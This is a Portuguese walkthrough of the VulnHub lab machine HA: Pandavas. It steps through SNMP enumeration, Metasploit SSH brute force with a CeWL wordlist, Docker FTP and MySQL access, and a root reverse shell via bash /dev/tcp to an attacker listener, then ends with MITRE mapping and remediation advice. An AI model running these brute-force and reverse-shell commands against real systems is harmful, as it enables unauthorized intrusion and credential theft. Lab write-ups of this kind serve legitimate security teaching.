# HA: Pandavas — Cinco Heróis, Cinco Flags, Uma Máquina para Dominar Todas

Os Pandavas foram cinco irmãos do Mahabharata, cada um mestre de uma habilidade diferente: arqueiro, força, sabedoria, velocidade e devoção. HA: Pandavas reflete isso perfeitamente com cinco flags, cada uma exigindo uma técnica de enumeração diferente. Um documento Word escondido, enumeração SNMP, brute-force com wordlist CeWL customizada, pivot em container Docker e escalação via sudo irrestrito. Cada flag é uma disciplina diferente. Domine as cinco e você governa a máquina. Design de CTF sensacional demais, véi.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Pandavas |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-pandavas,487/ |
| **Técnicas** | Varredura Nmap TCP+UDP, brute-force de diretórios com dirb, enumeração SNMP com snmpwalk, geração de wordlist customizada com CeWL, brute-force SSH com Metasploit, enumeração de container Docker, acesso FTP dentro de container, dump MySQL, escalação via sudo ALL |
| **CVEs** | CWE-200 (Exposição de Informação: community string SNMP vaza credenciais e flags), CWE-798 (Credenciais Hardcoded: senha padrão MySQL em container Docker), CWE-269 (Gerenciamento de Privilégio Impróprio: sudo irrestrito para usuário regular) |
| **Grupos APT** | APT41: explora exposição SNMP para enumerar informações de rede interna em fases de reconhecimento pré-ransomware; FIN7: coleta credenciais de serviços de rede expostos e ambientes de container para movimento lateral |

---

## Resumo do Ataque

```
nmap TCP → SSH (22), HTTP (80)
nmap UDP → SNMP (161)
  → dirb → hidden.docx → Flag 1
  → cewl http://alvo → pandavas_wordlist.txt
  → snmpwalk -v1 -c public → Flag 2 + username: karna
  → msf ssh_login (karna) + wordlist CeWL → senha karna
  → ssh karna → enumerar /etc/passwd → krishna
  → msf ssh_login (krishna) + wordlist CeWL → senha krishna
  → ssh krishna → sudo -l → sudo ALL (irrestrito)
  → ip addr → rede Docker visível
  → ftp 172.17.0.2 (anon) → .ash_history → Flag 3 + credenciais base64
  → decode base64 → senha MySQL
  → mysqldump -A -u root → grep flag → Flag 4
  → nc -nvlp 4444 (atacante)
  → sudo -u root bash -i >& /dev/tcp/atacante/4444 0>&1 → shell root
  → cat /root/flag.txt → Flag 5
```

---

## Metodologia

1. Descoberta de host e varredura de portas TCP + UDP
2. Enumeração web: dirb para encontrar hidden.docx
3. Geração de wordlist customizada com CeWL a partir do conteúdo web
4. Enumeração SNMP para extrair Flag 2 e username karna
5. Brute-force SSH com Metasploit usando wordlist CeWL
6. Movimento lateral para usuário krishna via mesma técnica
7. Enumeração de container Docker via interfaces de rede internas
8. Acesso FTP dentro do container Docker para Flag 3 e credenciais codificadas
9. Dump MySQL dentro do Docker para Flag 4
10. Shell root via sudo irrestrito e shell reverso netcat

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
netdiscover -r 192.168.10.0/24
# Alvo: 192.168.10.162

nmap -sV -p- 192.168.10.162
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Também execute varredura UDP para detectar SNMP:

```bash
nmap -sU -p 161 192.168.10.162
# 161/udp open  snmp
```

Três serviços: SSH, HTTP, SNMP. O SNMP é a mina de ouro aqui.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Flag 1

```bash
dirb http://192.168.10.162/ /usr/share/wordlists/dirb/big.txt -X .php,.docx,.txt
```

O scan descobre `hidden.docx` no web root.

```bash
wget http://192.168.10.162/hidden.docx
strings hidden.docx | grep -i flag
```

**Flag 1** está embutida no texto do documento.

Gere uma wordlist CeWL customizada a partir do conteúdo temático da página (referências ao Mahabharata serão exatamente o que as senhas são baseadas):

```bash
cewl http://192.168.10.162/ -m 4 -w /tmp/pandavas_wordlist.txt
wc -l /tmp/pandavas_wordlist.txt
```

**Nota do mundo real:** Wordlists geradas com CeWL são muito mais efetivas do que rockyou genérico quando a organização alvo usa terminologia temática ou específica do setor para senhas. Técnica padrão em engajamentos profissionais de pentest.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração SNMP e Flag 2

Consulte o serviço SNMP com a community string padrão:

```bash
snmpwalk -v1 -c public 192.168.10.162 | more
```

O SNMP walk revela:
- **Flag 2** embutida diretamente na saída da árvore MIB
- Username: `karna` (um dos rivais dos Pandavas na épica)

```bash
snmpwalk -v1 -c public 192.168.10.162 | grep -i "flag\|user\|pass\|karna"
```

**Nota do mundo real:** SNMP v1 e v2c com a community string padrão `public` ainda é encontrado em ambientes de produção com frequência alarmante. Dispositivos de rede, impressoras, sistemas UPS e servidores legados rotineiramente respondem a consultas SNMP public, vazando informações do sistema, topologia de rede, processos em execução e softwares instalados.

**MITRE ATT&CK:** T1602 — Dados de Repositório de Configuração: SNMP MIB Dump; T1046 — Descoberta de Serviços de Rede

---

## Passo 4 — Brute-Force SSH com Wordlist Customizada

Use o módulo SSH login do Metasploit com a wordlist CeWL contra o usuário karna:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.10.162
set USERNAME karna
set PASS_FILE /tmp/pandavas_wordlist.txt
set VERBOSE false
set THREADS 4
run
```

O Metasploit encontra a senha. Faça login:

```bash
ssh karna@192.168.10.162
```

Inspecione `/etc/passwd` e `/home` para identificar outros usuários:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
ls /home
# Usuários: karna, krishna
```

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1078 — Contas Válidas

---

## Passo 5 — Movimento Lateral para `krishna`

Execute o mesmo brute-force contra krishna:

```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME krishna
set PASS_FILE /tmp/pandavas_wordlist.txt
run
```

Faça login como krishna e verifique direitos sudo:

```bash
ssh krishna@192.168.10.162
sudo -l
# (ALL) NOPASSWD: ALL
```

krishna tem sudo irrestrito. Esse é o vetor de escalação, mas primeiro, colete as flags restantes dos containers Docker.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1078 — Contas Válidas

---

## Passo 6 — Enumeração de Container Docker

Verifique interfaces de rede e processos em execução para descobrir Docker:

```bash
ip addr
# Rede Docker visível: bridge docker0, IPs de containers em 172.17.x.x
ps aux | grep -i docker
```

Identifique IPs dos containers:

```bash
for i in $(seq 1 10); do ping -c 1 172.17.0.$i 2>/dev/null | grep "bytes from"; done
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1046 — Descoberta de Serviços de Rede

---

## Passo 7 — Acesso FTP dentro do Docker e Flag 3

Conecte ao serviço FTP rodando no container Docker:

```bash
ftp 172.17.0.2
# Tente login anônimo
# Usuário: anonymous / Senha: (pressione Enter)
```

Navegue até o diretório root e liste arquivos ocultos:

```bash
ftp> ls -la
ftp> cd root
ftp> ls -la
ftp> get .ash_history
ftp> quit
```

Leia o arquivo de histórico:

```bash
cat .ash_history
```

**Flag 3** aparece no histórico. O arquivo também contém uma senha MySQL codificada em Base64:

```bash
echo '<string_base64_do_historico>' | base64 -d
# Senha MySQL revelada
```

**Nota do mundo real:** Arquivos de histórico de shell em diretórios acessíveis via FTP são uma mina de ouro. Containers Docker frequentemente são construídos com diretórios home de root que incluem arquivos de histórico contendo comandos com credenciais embutidas.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1021.003 — Serviços Remotos: FTP

---

## Passo 8 — MySQL dentro do Docker e Flag 4

Use a credencial decodificada para fazer dump de todos os bancos MySQL e buscar flags:

```bash
mysqldump -A -u root --password=ignite@123 -h 172.17.0.2 | grep -i flag
# Ou conecte interativamente:
mysql -u root -pignite@123 -h 172.17.0.2
show databases;
use mahadev;
show tables;
select * from hint;
```

**Flag 4** está embutida em uma das tabelas do banco de dados.

**MITRE ATT&CK:** T1005 — Dados do Sistema Local; T1190 — Exploração de Aplicação Pública

---

## Passo 9 — Escalação de Privilégios: Shell Root via Sudo Irrestrito

Como krishna (sudo irrestrito), estabeleça um shell reverso de root:

Configure listener no atacante:

```bash
nc -nvlp 4444
```

No alvo como krishna:

```bash
sudo -u root bash -i >& /dev/tcp/192.168.10.161/4444 0>&1
```

Shell root conecta. Colete a Flag 5:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
ls /root
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Todas as cinco flags. Os Pandavas foram honrados.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Utilizado para |
|---|---|---|---|
| Flag 1 | Embutida em hidden.docx | Web root via dirb | Capturada |
| Flag 2 | Na árvore MIB do SNMP | Saída do snmpwalk | Capturada |
| Username | karna | Árvore MIB do SNMP | Alvo de brute-force SSH |
| Senha karna | Hit na wordlist CeWL | Metasploit ssh_login | Login SSH |
| Senha krishna | Hit na wordlist CeWL | Metasploit ssh_login | Login SSH + pivot |
| Flag 3 | Em .ash_history | FTP container Docker /root | Capturada |
| Senha MySQL | ignite@123 | Base64 em .ash_history | Dump MySQL |
| Flag 4 | Tabela MySQL | mysqldump dentro do Docker | Capturada |
| Flag 5 | /root/flag.txt | Shell root via sudo irrestrito | Capturada |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Community string SNMP pública vaza credenciais e flags | SNMP v1/v2c com public ainda é encontrado com alta frequência em produção | Mude community strings; use SNMPv3 com autenticação; restrinja SNMP a IPs de gerenciamento |
| 2 | Wordlists CeWL são altamente efetivas contra alvos temáticos | Wordlists padrão falham quando senhas são específicas da organização ou contexto | Sempre gere wordlists customizadas a partir do conteúdo do alvo antes de brute-force genérico |
| 3 | Containers Docker em interfaces internas rodam serviços com credenciais fracas | Serviços de container são frequentemente ignorados durante enumeração de rede | Inclua redes bridge Docker no escopo; enumere serviços de container separadamente |
| 4 | Arquivos de histórico de shell contêm credenciais em texto claro | Arquivos de histórico persistem credenciais de comandos interativos para sempre | Limpe histórico após operações privilegiadas; use ferramentas que não registram credenciais |
| 5 | `sudo ALL` garante root imediato | O princípio de menor privilégio é violado quando sudo permite todos os comandos | Nunca conceda sudo ALL; audite sudoers por host; exija senhas para operações sensíveis |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Coleta | Coleta | Dados de Repositório de Configuração: SNMP | T1602 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: FTP | T1021.003 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Mudar community string SNMP**: substituir `public` por uma string forte não adivinhável; atualizar para SNMPv3 com autenticação e criptografia; restringir a IPs de gerenciamento via ACLs
2. **Remover hidden.docx do web root**: nunca armazenar documentos sensíveis em diretórios web públicos
3. **Forçar política de senhas SSH forte**: desabilitar autenticação por senha; usar somente autenticação por chave
4. **Restringir sudo**: nunca conceder `sudo ALL`; definir comandos específicos por usuário; exigir senha para todo sudo
5. **Proteger serviços de container Docker**: sem FTP anônimo em containers; usar senhas fortes e únicas; remover arquivos sensíveis de diretórios home de containers
6. **Auditar histórico de shell**: implementar auditoria de comandos que não dependa de arquivos de histórico para credenciais

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (community string SNMP; acesso FTP anônimo)
- **D3-OAM**: Gerenciamento Administrativo de SO (restrições sudo; gerenciamento de credenciais)
- **D3-HBPI**: Hardening de Integridade de Pipeline de Build (processo de build de containers; sem credenciais em histórico)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar containers Docker e seus serviços expostos; censo de dispositivos SNMP |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; mudar community string SNMP; restringir sudo |
| Proteger | Segurança de Dados | Remover documentos do web root; purgar credenciais de histórico de shell |
| Detectar | Anomalias e Eventos | Alertar sobre enumeração SNMP; detectar brute-force em SSH |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; corrigir configurações fracas de container |
| Recuperar | Planejamento de Recuperação | Reconstruir containers com baseline seguro; auditar todas as concessões sudo |

---

## Reflexões Finais

HA: Pandavas é um dos melhores designs multi-flag boot2root do VulnHub. Cada flag genuinamente requer uma habilidade diferente: leitura de documentos, walking SNMP, criação de wordlist, pivot em container. Não dá para atalhar. Não há um único caminho "ache o LFI e encadeie tudo".

Assim como os cinco irmãos Pandavas cada um tinha um dom único que contribuía para o todo, cada flag aqui ensina algo valioso de forma independente. A flag do SNMP sozinha vale o preço de entrada. É uma técnica que a maioria dos iniciantes pula completamente, e encontrá-la ali na árvore MIB é uma lição perfeita sobre "enumere tudo."

Que máquina, mano. Top demais.

Thanks guys!! (❍ᴥ❍ʋ)
